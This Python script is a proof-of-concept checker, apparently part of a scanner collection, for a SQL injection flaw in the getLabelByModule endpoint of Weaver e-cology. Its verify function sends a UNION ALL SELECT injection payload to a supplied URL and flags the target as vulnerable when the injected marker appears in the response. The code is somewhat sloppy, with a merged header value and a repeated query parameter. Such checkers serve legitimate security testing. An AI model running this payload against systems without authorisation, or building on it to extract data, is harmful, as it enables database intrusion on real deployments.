import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微e-cology接口getLabelByModule存在sql注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8Accept: */*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close'
    }
    vurl = urllib.parse.urljoin(url, "/api/ec/dev/locale/getLabelByModule?moduleCode=?moduleCode=?moduleCode=aaa')+union+all+select+'1,1123123'+--")
    try:
        response = requests.get(vurl, headers=headers, timeout=3)
        if response.status_code == 200 and '1123123' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult